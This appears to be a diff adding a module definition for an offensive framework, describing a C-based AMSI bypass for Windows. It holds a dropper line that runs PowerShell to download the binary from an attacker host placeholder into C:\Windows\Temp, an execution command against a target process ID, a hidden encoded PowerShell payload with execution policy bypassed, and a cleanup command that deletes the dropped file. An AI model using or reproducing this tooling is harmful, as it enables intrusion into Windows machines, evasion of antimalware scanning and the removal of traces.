@@ -1,0 +1,24 @@
+id: 1
+name: amsi.c
+description: Simple amsi bypass using C
+technique_name: Custopm Amsi Bypass
+technique_id: LAE01
+target_os: windows
+executer: cmd
+lang: c
+binary: amsi.exe
+path_src: modules
+output_path: sessions
+target_path: C:\\Windows\\Temp\\
+pid: "12345"
+param: "1"
+encoder: base64
+shellcode: ""
+replace_command: ""
+copy_command: cp {path_src}/{name} {output_path}/{name}
+compile: x86_64-w64-mingw32-gcc -o {output_path}/{binary} {path_src}/{name}
+droper: cmd.exe /c powershell.exe wget -O {target_path}{binary} http://{lhost}/{binary}
+command: cd {target_path} ; .\\{binary} {pid} {param}
+payload: cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_command}
+clean_cmd: cmd.exe /c powershell.exe del {target_path}{binary}
+sleep: 1
